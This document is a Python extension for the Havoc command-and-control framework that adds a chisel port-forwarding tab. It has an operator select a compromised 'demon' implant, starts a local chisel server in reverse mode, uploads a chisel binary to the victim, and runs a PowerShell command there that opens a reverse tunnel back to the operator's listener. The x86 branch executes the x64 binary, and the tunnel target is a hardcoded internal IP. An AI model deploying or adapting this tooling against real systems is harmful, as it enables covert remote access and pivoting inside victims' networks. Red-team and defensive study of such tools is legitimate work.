import havoc
import havocui
import subprocess
import shutil

port_forward = havocui.Widget("Chisel Method", True)
demons = []

# Initialization of Port Forward variables
instance = None
selected_arch = None
listener = None
local_port = None
remote_port = None

# Function to execute command in terminal.
def execute_command_in_terminal(command):
    """
    Executes a command in a new terminal window and keeps it open.

    This function is tailored for Linux distributions like Kali Linux, Arch, Debian, Ubuntu, etc.
    """
    try:
        # Check if gnome-terminal is installed
        if shutil.which('gnome-terminal') is not None:
            subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f'{command}; exec bash'], shell=False)
        # Fallback to xterm if gnome-terminal is not available
        elif shutil.which('xterm') is not None:
            subprocess.Popen(['xterm', '-hold', '-e', command], shell=False)
        # Fallback to QTerminal if neither gnome-terminal nor xterm is available
        elif shutil.which('qterminal') is not None:
            subprocess.Popen(['qterminal', '-e', f'bash -c "{command}; exec bash"'], shell=False)
        else:
            # Neither gnome-terminal, xterm, nor QTerminal is available
            raise EnvironmentError("No suitable terminal emulator found (gnome-terminal, xterm, or QTerminal). Please install one.")
    except Exception as e:
        print(f"An error occurred while executing the command in terminal: {e}")
        havocui.errormessage(f"An error occurred while executing the command in terminal: {e}")



# Function definitions
def select_demon(num):
    global instance
    try:
        if num != 0:
            instance = havoc.Demon(demons[num-1])
    except Exception as e:
        havocui.errormessage(f"Error selecting demon: {e}")

def select_arch(arch):
    global selected_arch
    try:
        selected_arch = arch
    except Exception as e:
        havocui.errormessage(f"Error selecting architecture: {e}")

def set_listener(liste):
    global listener
    try:
        listener = liste
    except Exception as e:
        havocui.errormessage(f"Error selecting the listener: {e}")

def set_localport(num):
    global local_port
    try:
        local_port = num
    except Exception as e:
        havocui.errormessage(f"Error setting local port: {e}")

def set_remoteport(num):
    global remote_port
    try:
        remote_port = num
    except Exception as e:
        havocui.errormessage(f"Error setting remote port: {e}")

# Get user input
def open_portforward():
    try:
        port_forward.clear()
        global demons
        demons = havoc.GetDemons()

        # Check if demons are available
        if not demons:
            havocui.errormessage("No demons available!")
            return

        port_forward.addLabel("<h3 style='color:#bd93f9'>Select the demon to execute Chisel Client:</h3>")
        port_forward.addCombobox(select_demon, "select demon", *demons)
        port_forward.addLabel("<h3 style='color:#bd93f9'>Select the architecture of the victim:</h3>")
        port_forward.addCombobox(select_arch, "select architecture", "Windows x86", "Windows x64")
        port_forward.addLabel("<span style='color:#71e0cb'>Introduce listener IP:</span>")
        port_forward.addLineedit(str(listener) if listener else "", set_listener)
        port_forward.addLabel("<span style='color:#71e0cb'>Introduce local port:</span>")
        port_forward.addLineedit(str(local_port) if local_port else "", set_localport)
        port_forward.addLabel("<span style='color:#71e0cb'>Introduce remote port:</span>")
        port_forward.addLineedit(str(remote_port) if remote_port else "", set_remoteport)
        port_forward.addButton("Start Chisel!", run_port_forward)
        port_forward.setSmallTab()
    except Exception as e:
        havocui.errormessage(f"An error occurred in open_portforward: {e}")

# Command execution section
def run_port_forward():
    global instance
    global selected_arch
    global listener
    global local_port
    global remote_port

    try:
        if instance is None:
            havocui.errormessage("You have not selected a demon! Please select the demon where you want to execute Chisel.")
            return
        
        # Set up chisel server.
        havocui.messagebox("Setting up Chisel Server", "Executes chisel server in a new terminal window and keeps it open")
        command = "./data/extensions/Havoc-Port-Forwarding/chisel server -p 12312 --reverse"
        execute_command_in_terminal(command)

        # Upload the correct version of chisel based on the selection:
        if selected_arch == 1:
            # Upload x86
            TaskID = instance.ConsoleWrite(instance.CONSOLE_TASK, "Tasked demon to use Chisel x86")
            uploadBinary = "upload data/extensions/Havoc-Port-Forwarding/x86/chiselx86.exe"
            instance.Command(TaskID, uploadBinary)

            # Execute Chisel Client:
            print(listener)
            TaskID = instance.ConsoleWrite(instance.CONSOLE_TASK, "Tasked demon to execute chiselx86 client")
            executeChisel = "powershell .\chiselx64.exe client %s:12312 R:%s:10.4.225.215:%s" % (listener, local_port, remote_port)
            instance.Command(TaskID, executeChisel)


        elif selected_arch == 2:
            # Upload x64
            TaskID = instance.ConsoleWrite(instance.CONSOLE_TASK, "Tasked demon to use Chisel x64")
            uploadBinary = "upload data/extensions/Havoc-Port-Forwarding/x64/chiselx64.exe"
            instance.Command(TaskID, uploadBinary)

            # Execute Chisel Client:
            TaskID = instance.ConsoleWrite(instance.CONSOLE_TASK, "Tasked demon to execute chiselx64 client")
            executeChisel = "powershell .\chiselx64.exe client %s:12312 R:%s:10.4.225.215:%s" % (listener, local_port, remote_port)
            instance.Command(TaskID, executeChisel)

        else:
            havocui.errormessage("The arch does not work. Value of arch: " + str(selected_arch))

        return TaskID
    except Exception as e:
        havocui.errormessage(f"An error occurred in run_port_forward: {e}")

# Create the tab to show options within Havoc
try:
    havocui.createtab("Port Forward", "Chisel", open_portforward)
except Exception as e:
    havocui.errormessage(f"An error occurred while creating the tab: {e}")
